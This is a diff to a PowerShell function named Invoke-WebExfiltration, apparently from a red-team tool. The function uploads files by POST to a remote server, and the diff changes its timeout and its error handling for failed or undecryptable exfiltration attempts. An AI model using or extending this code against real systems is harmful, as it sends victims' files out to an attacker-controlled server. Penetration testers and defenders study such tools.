@@ -165,7 +165,7 @@ Function Invoke-WebExfiltration {
 
         Write-Verbose "Uploading file '$file_name'"
         $uri = [uri]::EscapeUriString($target)
-        $rest_timeout = 5
+        # $rest_timeout = 10
 
         # ToDo: implement prameter '-insecure' if certificate is not trusted (e.g. self signed)
 
@@ -178,7 +178,7 @@ Function Invoke-WebExfiltration {
                 Write-Host "[X] Error: Proxy not supported yet. I'm not sending anything!"
 
             } else {
-                $response = Invoke-WebRequest -Uri $uri -Method POST -Body ($body|ConvertTo-Json) -ContentType "application/json" -TimeoutSec $rest_timeout
+                $response = Invoke-WebRequest -Uri $uri -Method POST -Body ($body|ConvertTo-Json) -ContentType "application/json"  # -TimeoutSec $rest_timeout
             }
         }catch [System.Net.WebException] {
             if($_.Exception.Status -eq 'Timeout'){
@@ -189,8 +189,21 @@ Function Invoke-WebExfiltration {
             }
         }
         catch  [System.Net.Http.HttpRequestException] {
-            Write-Host "[X] Error: I think I could not connect to the server. Got this error: '$($_.Exception.Message)'"
-            break
+             $response_code = $_.Exception.Response.StatusCode
+             $message = $_.Exception.Message
+
+            if ($message -like "No connection could be made*"){
+                Write-Host "[X] Error: Could not connect to the server. Got this error: '$($_.Exception.Message)'"
+            } elseif ($response_code -eq '400') {
+                Write-Host "[X] Error: Got HTTP code '400' from server."
+                Write-Host "[X] Error: This means that the server could not decrypt the file. Thus, the file was NOT exfiltrated!"
+                Write-Host "[X] Error: Did you specify the wrong password?"
+            } else {
+                Write-Host "[X] Error: Got unexpected response code '$response_code' from server"
+                Write-Host "[X] Error: Message from server: '$message'"
+            }
+             Break
+
         }
         catch {
             Write-Host "[X] Error: An unknown error occured! $($_.Exception.GetType().FullName)"
@@ -200,12 +213,13 @@ Function Invoke-WebExfiltration {
             break
         }
 
-        if ($response.StatusCode -ne '200'){
-            Write-Host "[!] Error: Sending successfull but got resonse code '$($response.StatusCode)' from server. The file was probably not exfiltrated!"
-            Write-Host "[!] Error: Message from server: '$($response.Content)'"
+         # Some return code handling
+         if ($response.StatusCode -ne '200'){
+                Write-Host "[X] Error: Got unexpected response code '$($response.StatusCode)' from server"
+                Write-Host "[X] Error: Message from server: '$($response.Content)'"
         }
 
-        Write-Verbose "Uploaded '$file_name'"
+         Write-Verbose "Uploaded '$file_name'. Server returned message: '$($response.Content)'"
     }
 
      End {
